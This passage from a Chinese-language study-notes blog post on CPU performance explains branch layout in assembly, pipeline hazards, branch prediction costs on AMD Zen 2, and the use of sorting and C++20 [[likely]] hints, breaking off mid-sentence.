<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">        <span class="keyword">return</span> x - y;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> y - x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>但如果我们直接翻译成汇编语言：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length:</span><br><span class="line">    cmp  edi, esi</span><br><span class="line">    jle  less</span><br><span class="line">    ; x &gt; y</span><br><span class="line">    sub  edi, esi</span><br><span class="line">    mov  eax, edi</span><br><span class="line">done:</span><br><span class="line">    ret</span><br><span class="line">less:</span><br><span class="line">    ; x &lt;= y</span><br><span class="line">    sub  esi, edi</span><br><span class="line">    mov  eax, esi</span><br><span class="line">    jmp  done</span><br></pre></td></tr></table></figure></div>
<p>很明显可以发现，如果<code>x&gt;y</code>，只用5条指令就完成了函数调用；但是如果<code>x&lt;=y</code>，就额外需要经过两次跳转。</p>
<p>其实我们可以假设<code>x&gt;y</code>是不大可能的，然后将如上c代码优化为如下版本：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">        swap(x, y);</span><br><span class="line">    <span class="keyword">return</span> y - x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>其对应汇编如下，显而易见比上述实现方式短了两个指令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length:</span><br><span class="line">    cmp  edi, esi</span><br><span class="line">    jle  normal     ; if x &lt;= y, no swap is needed, and we can skip the xchg</span><br><span class="line">    xchg edi, esi</span><br><span class="line">normal:</span><br><span class="line">    sub  esi, edi</span><br><span class="line">    mov  eax, esi</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>但我们还能进一步优化，我们可以直接认为<code>x&gt;y</code>不可能发生，优化为如下汇编实现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length:</span><br><span class="line">    cmp  edi, esi</span><br><span class="line">    jg   swap</span><br><span class="line">normal:</span><br><span class="line">    sub  esi, edi</span><br><span class="line">    mov  eax, esi</span><br><span class="line">    ret</span><br><span class="line">swap:</span><br><span class="line">    xchg edi, esi</span><br><span class="line">    jmp normal</span><br></pre></td></tr></table></figure></div>
<p>这种优化看起来没什么改变，实际上通过把swap提取到正常执行逻辑之外，可以减少跳转的次数，从而节省时间。第一种形式每次都会有
<strong>条件跳转</strong>（<code>jle</code>），即使在大部分情况下不需要执行交换。而第二种方式在正常情况下不会执行跳转，从而避免了跳转带来的延迟，提升了性能。</p>
<p>对应实现的C代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> {</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y) [[unlikely]]</span><br><span class="line">        swap(x, y);</span><br><span class="line">    <span class="keyword">return</span> y - x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<h3 id="三指令级并行性ilp">三、指令级并行性（ILP）</h3>
<h4 id="概述-1">概述</h4>
<p>这里的并行并不是指多核并行，因为多核并行实质上是用多个核心实现<strong>计算资源的整合</strong>和<strong>上限突破</strong>，是用计算资源换取效率。这里我们仅考虑一个核心内部的指令并行。执行一条指令大致需要如下5步操作：</p>
<ul>
<li>取指（IF）</li>
<li>解码（ID）</li>
<li>执行（EX）</li>
<li>存储（MEM）</li>
<li>写回（WB）</li>
</ul>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/image-20250313225642301-1741877811093-3.png" class="">
<h4 id="流水线风险">流水线风险</h4>
<p><strong>三种主要的流水线风险</strong></p>
<ol type="1">
<li><strong>结构风险（Structural Hazards）</strong>：
<ul>
<li><strong>定义</strong>：结构风险发生在两个或多个指令需要相同的CPU资源时。例如，多个指令可能需要访问相同的执行单元（如加法器或乘法器）。如果这个执行单元在某一时刻无法同时处理多条指令，就会发生结构性风险。</li>
<li><strong>后果</strong>：为了避免冲突，必须等待执行单元空闲后再执行指令，通常这需要额外的一个时钟周期。</li>
<li><strong>解决方法</strong>：结构风险无法完全避免，它们是性能瓶颈的根源，通常需要通过<strong>硬件设计</strong>上的调整（例如，增加更多的执行单元）来应对。</li>
</ul></li>
<li><strong>数据风险（Data Hazards）</strong>：
<ul>
<li><strong>定义</strong>：数据风险发生在指令之间存在依赖关系时。例如，某条指令的操作数依赖于前一条指令的计算结果。如果前一条指令还未完成，后续指令就无法执行。</li>
<li><strong>后果</strong>：这种情况下，必须等待前一条指令计算完成，才能获取必要的数据，这会导致流水线停顿。数据风险的大小取决于<strong>关键路径的延迟</strong>，即需要等待的数据多久才能计算出来。</li>
<li><strong>解决方法</strong>：通过<strong>重新组织计算顺序</strong>来缩短关键路径，避免不必要的等待。例如，重新安排指令的顺序，或者利用<strong>数据转发（data
forwarding）</strong>技术，将计算结果直接传递给后续指令，避免从寄存器读取的延迟。</li>
</ul></li>
<li><strong>控制风险（Control Hazards）</strong>：
<ul>
<li><strong>定义</strong>：控制风险发生在CPU无法预测下一条需要执行的指令时，通常发生在<strong>分支指令</strong>（如<code>if</code>语句）之后。CPU必须等待条件判断的结果，才能确定接下来的执行路径。</li>
<li><strong>后果</strong>：如果分支预测失败，CPU通常需要<strong>清空流水线</strong>，丢弃所有已取指的指令，并重新加载正确的指令，这会浪费15-20个时钟周期。</li>
<li><strong>解决方法</strong>
<ul>
<li><strong>消除分支</strong>：通过<strong>循环展开（loop
unrolling）</strong>等技术消除分支，从而避免控制风险。</li>
<li><strong>分支预测</strong>：通过优化分支预测，使得CPU能够有效猜测分支的方向。现代CPU使用<strong>动态分支预测</strong>技术，能够根据历史记录预测分支的走向，从而减少控制风险的影响。</li>
<li><strong>分支预测精度</strong>：通过改进分支预测算法，使得分支预测更准确，减少流水线清空的次数。</li>
</ul></li>
</ul></li>
</ol>
<h4 id="分支预测">分支预测</h4>
<p>分支预测的核心问题正是 CPU
的<strong>流水线处理方式</strong>导致的。具体来说，现代 CPU
采用<strong>指令流水线</strong>（pipeline）技术，以提高指令执行的并行度和吞吐量。但在遇到<strong>分支指令</strong>时，由于目标地址可能依赖于尚未执行完的计算结果，导致
CPU
<strong>无法提前确定下一条应该执行的指令</strong>，进而产生流水线的停顿。那为什么我们要进行分支预测呢？这是因为如果我们使流水线停顿等待分支条件的计算结果，中间的等待的时间就相对浪费了，那么我们如果知道执行的概率分布，就可以挑一个可能更高的分支进行<strong>预执行</strong>，那么等到分支条件的计算结果出来之后，如果我们预测成功，相当于高效利用了计算分支条件的这段时间。</p>
<h5 id="case-study">case study</h5>
<p>假如有如下c代码，假设a数组中等可能随机分布着0-99的数值：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="number">50</span>)</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>其在Clang下编译出的结果大致如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov  rcx, -4000000</span><br><span class="line">    jmp  body</span><br><span class="line">counter:</span><br><span class="line">    add  rcx, 4</span><br><span class="line">    jz   finished   ; "jump if rcx became zero"</span><br><span class="line">body:</span><br><span class="line">    mov  edx, dword ptr [rcx + a + 4000000]</span><br><span class="line">    cmp  edx, 49</span><br><span class="line">    jg   counter</span><br><span class="line">    add  dword ptr [rsp + 12], edx</span><br><span class="line">    jmp  counter</span><br></pre></td></tr></table></figure></div>
<p>这也是个不对称的分支，如果进入<code>a[i] &lt; 50</code>的这个分支，需要多执行
<code>add  dword ptr [rsp + 12], edx</code>
这样一个指令，大约需要多花费4个时钟周期。由于 <code>a[i]</code> 的值是
<strong>完全随机的</strong>，<code>a[i] &lt; 50</code> 成立的概率大约是
<strong>50%</strong>。<code>volatile</code>
关键字的作用是<strong>防止编译器优化</strong>（比如循环展开、向量化等），确保代码执行顺序与写法一致。</p>
<p>现代 CPU 采用
<strong>流水线（pipeline）技术</strong>，在执行一条指令时，会<strong>提前加载下一条指令</strong>。但如果遇到<strong>不可预测的分支</strong>，就会出现
<strong>分支预测失败（Branch Misprediction）</strong>，导致 CPU
<strong>清空流水线</strong>，重新加载正确的指令。</p>
<p>在 <strong>AMD Zen 2</strong> 上：</p>
<ul>
<li>CPU 的流水线大约有 <strong>19
个阶段</strong>，如果分支预测失败，就需要 <strong>19 个周期</strong>
来填充流水线。</li>
<li>每次循环：
<ol type="1">
<li><strong>读取数组值（memory load）+
比较（compare）</strong>：大约需要 5 个周期。</li>
<li><strong>加法操作（如果满足条件）</strong>：大约需要 4 个周期。</li>
<li><strong>50% 预测失败的情况下，每 2 次循环需要清空流水线一次（19
个周期）</strong>。</li>
</ol></li>
</ul>
<p>那么，每两个元素的平均执行时间是： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="37.598ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 16618.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(1111.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2111.4,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(2833.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3833.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(4833.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5222.9,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mn" transform="translate(5722.9,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(6500.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(7556.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g><g data-mml-node="mtext" transform="translate(8556.4,0)"><path data-c="A0" d=""></path><path data-c="63" d="M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z" transform="translate(250,0)"></path><path data-c="79" d="M69 -66Q91 -66 104 -80T118 -116Q118 -134 109 -145T91 -160Q84 -163 97 -166Q104 -168 111 -168Q131 -168 148 -159T175 -138T197 -106T213 -75T225 -43L242 0L170 183Q150 233 125 297Q101 358 96 368T80 381Q79 382 78 382Q66 385 34 385H19V431H26L46 430Q65 430 88 429T122 428Q129 428 142 428T171 429T200 430T224 430L233 431H241V385H232Q183 385 185 366L286 112Q286 113 332 227L376 341V350Q376 365 366 373T348 383T334 385H331V431H337H344Q351 431 361 431T382 430T405 429T422 429Q477 429 503 431H508V385H497Q441 380 422 345Q420 343 378 235T289 9T227 -131Q180 -204 113 -204Q69 -204 44 -177T19 -116Q19 -89 35 -78T69 -66Z" transform="translate(694,0)"></path><path data-c="63" d="M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z" transform="translate(1222,0)"></path><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" transform="translate(1666,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1944,0)"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(2388,0)"></path><path data-c="20" d="" transform="translate(2782,0)"></path><path data-c="70" d="M36 -148H50Q89 -148 97 -134V-126Q97 -119 97 -107T97 -77T98 -38T98 6T98 55T98 106Q98 140 98 177T98 243T98 296T97 335T97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 61 434T98 436Q115 437 135 438T165 441T176 442H179V416L180 390L188 397Q247 441 326 441Q407 441 464 377T522 216Q522 115 457 52T310 -11Q242 -11 190 33L182 40V-45V-101Q182 -128 184 -134T195 -145Q216 -148 244 -148H260V-194H252L228 -193Q205 -192 178 -192T140 -191Q37 -191 28 -194H20V-148H36ZM424 218Q424 292 390 347T305 402Q234 402 182 337V98Q222 26 294 26Q345 26 384 80T424 218Z" transform="translate(3032,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(3588,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(4032,0)"></path><path data-c="20" d="" transform="translate(4424,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(4674,0)"></path><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" transform="translate(5118,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(5396,0)"></path><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(5840,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(6673,0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(7117,0)"></path><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(7673,0)"></path></g></g></g></svg></mjx-container></span> 这与实验测得的 <strong>14 个周期/循环</strong> 完全一致，说明
<strong>分支预测失败</strong>
是主要的性能瓶颈。如果我们改变分支的比较条件为小于P，则能得到图表如下：</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/probabilities.svg" class="">
<p>最大值在50处，这比较直观，因为50%概率相当于完全随机选取一个分支进行预取执行，很容易分支预测失败并丢弃整个流水线重新加载。最小值在P=0处，此时相当于每次必不进入分支，那每次基本就只用检查一下条件是否满足。而有一个极小值在85-90%左右，这是因为进入分支会多执行加法操作，会多花约4
个周期。超过了这个转折点，多执行的加法操作代价就超过了10%概率丢弃流水线的代价了。</p>
<h5 id="模式识别">模式识别</h5>
<p>前面我们讨论了 <strong>分支预测失败（Branch Misprediction）</strong>
对性能的影响。在 <code>P=50%</code>（也就是 <code>a[i]</code> 以 50%
的概率小于 50）的情况下，由于数据是随机分布的，CPU 无法准确预测
<code>if (a[i] &lt; 50)</code> 语句的走向，因此
<strong>每次预测失败都会导致流水线清空</strong>，最终导致 <strong>14
cycles/element</strong> 的低效执行。</p>
<p><strong>1. 排序优化</strong></p>
<p>我们可以在计算前 <strong>先对数组进行排序</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    a[i] = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">std::<span class="built_in">sort</span>(a, a + N);</span><br></pre></td></tr></table></figure></div>
<p>这样，数组 <code>a</code> 变成了一个 <strong>递增序列</strong>：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">0, 1, 2, ..., 49, 50, ..., 99</span>]</span><br></pre></td></tr></table></figure></div>
<p>这意味着：</p>
<ul>
<li><strong>前半部分</strong> (<code>a[i] &lt; 50</code>)
<strong>连续执行 "yes" 分支</strong>。</li>
<li><strong>后半部分</strong> (<code>a[i] &gt;= 50</code>)
<strong>连续执行 "no" 分支</strong>。</li>
</ul>
<p>这时，<strong>CPU 的分支预测器可以轻松适应这个模式</strong>：</p>
<ul>
<li><strong>在前 50% 的数据里，分支总是跳转到 <code>s += a[i]</code>
语句</strong>。</li>
<li><strong>在后 50% 的数据里，分支总是不进入加法逻辑</strong>。</li>
</ul>
<p>因为 CPU 的 <strong>动态分支预测器（Dynamic Branch
Predictor）</strong> 能检测到<strong>“连续命中”模式</strong>，所以流水线
<strong>几乎不会被清空</strong>，这样<strong>每个元素的计算只需要 4
cycles，而不是 14 cycles</strong>。</p>
<p><strong>2. 预测器如何学习更复杂的模式？</strong></p>
<p>现代 CPU 的分支预测器远比 <strong>“历史统计”</strong>
更先进。它们不仅会<strong>记录某个分支的过去走向</strong>，还会<strong>识别更复杂的执行模式</strong>。</p>
<p><strong>实验 1：减少 <code>N</code> 的大小</strong>
如果我们把数组大小 <code>N</code> <strong>减少到
1000</strong>，但<strong>不排序</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    a[i] = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br></pre></td></tr></table></figure></div>
<p>此时，CPU <strong>可以完全记住所有 1000
个数据点的分支模式</strong>：</p>
<ul>
<li>因为 <strong>分支预测器的历史表（BTB, Branch Target
Buffer）能够存储足够多的历史信息</strong>，它可以记住 <strong>每个
<code>a[i] &lt; 50</code> 的位置</strong>，从而 <strong>100%
预测成功</strong>。</li>
<li>这样，CPU <strong>根本不会犯错</strong>，分支预测
<strong>几乎完美</strong>，导致 <strong>执行时间降到 4 cycles/element
以下</strong>！</li>
</ul>
<h5 id="分支提示">分支提示</h5>
<p>如果我们<strong>事先知道某个分支更可能被执行</strong>，可以
<strong>显式地告诉编译器</strong>，让它优化指令布局，使 CPU
处理分支更快。</p>
<p>C++20 引入了 <code>[[likely]]</code>
关键字，可以用于指示某个分支<strong>更有可能被执行</strong>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; P) [[likely]]  <span class="comment">// 提示这个分支更可能执行</span></span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>当 <code>P=75</code> 时：</p>
<ul>
<li><strong>使用 <code>[[likely]]</code></strong>：执行速度 <strong>≈
7.3 cycles/element</strong></li>
<li><strong>不使用 <code>[[likely]]</code></strong>：执行速度 <strong>≈
